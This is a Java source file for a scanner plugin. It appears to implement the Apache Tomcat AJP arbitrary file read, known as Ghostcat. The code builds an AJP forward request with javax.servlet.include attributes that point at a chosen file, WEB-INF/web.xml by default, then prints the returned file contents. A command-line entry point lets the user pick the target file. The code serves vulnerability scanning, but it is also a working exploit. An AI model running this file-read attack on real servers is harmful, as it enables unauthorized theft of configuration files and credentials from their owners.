package com.gbw.scanner.plugins.scripts.web.tomcat;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
import com.gbw.scanner.sink.SinkQueue;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.Options;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.List;

public class GBWScanAJPScript implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanScript.class);

    private GBWScanAJPConfig config;

    public GBWScanAJPScript(GBWScanAJPConfig config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    private GBWAJPMessage createAJPMessage(Host host){

        GBWAJPForwardRequest request = new GBWAJPForwardRequest(host,config.getUri());

	    request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_ACCEPT),"text/html");
        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_CONNECTION),"keep-alive");
        request.addHeader(GBWAJPConstants.getHeaderString(GBWAJPConstants.SC_REQ_CONTENT_LENGTH),"0");

        request.addAttr("req_attribute","javax.servlet.include.request_uri,/");
        request.addAttr("req_attribute",String.format("javax.servlet.include.path_info,%s",config.getFile()));
        request.addAttr("req_attribute","javax.servlet.include.servlet_path,/");

        request.setIs_ssl(config.isSSL());
        request.setData_direction(GBWAJPConstants.SERVER_TO_CONTAINER);
        return request.createMessage(4096);
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        GBWAJPClient client = null;
        try{
            client = new GBWAJPClient(host,config);

            GBWAJPMessage message = createAJPMessage(host);

            List<GBWAJPResponse> responses = client.sendAndReceive(message,null);

            if(responses!=null&&responses.size()>0){

                log.warn(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));
                System.out.println(String.format("Find a apache tomcat ajp any file download poc in:%s:%d",host.getServer(),host.getPort()));

                if(sinkQueue!=null) {
                    sinkQueue.put(new GBWScanAJPResult(config, host, responses));
                }else{

                    System.out.println(getText(responses));
                }
                //System.out.println(new String(data));
            }
        }catch (Exception e){
            System.out.println(String.format("scan tomcat any file download ip:%s:%d,error:%s",host.getIp(),host.getPort(),e.getMessage()));
        }finally {

            if(client!=null)
                client.close();
        }
    }

    private  String getText(List<GBWAJPResponse> responses){

        StringBuffer sb = new StringBuffer();
        responses.forEach(res->{
            sb.append(res.getData());
        });

        return sb.toString();
    }

    public static void main(String[] args)  throws Exception {

        Options opts = new Options();
        GBWScanAJPConfig config = new GBWScanAJPConfig();

        String uri = "/";
        String file = "WEB-INF/web.xml";
        boolean isSSL = false;
        int maxLen = 8192;

        opts.addOption("uri",true,"tomcat root uri");
        opts.addOption("file",true,"will download file");
        opts.addOption("ssl",false,"use ssl or not");
        opts.addOption("maxLen",true,"size limits of download file");

        GBWScanAJPScript scanAJPScript = new GBWScanAJPScript(config);

        GBWScanScriptTool tool = new GBWScanScriptTool(args,scanAJPScript,opts,8009);

        CommandLine cli = tool.getCliParser();

        if(cli.hasOption("uri")){
            uri = cli.getOptionValue("uri");
        }
        if(cli.hasOption("file")){
            file = cli.getOptionValue("file");
        }
        if(cli.hasOption("ssl")){
            isSSL = true;
        }

        if(cli.hasOption("maxLen")){
            maxLen = Integer.parseInt(cli.getOptionValue("maxLen"));
        }

        config.setUri(uri);
        config.setFile(file);
        config.setSSL(isSSL);
        config.setMaxLen(maxLen);

        tool.start();
    }

}
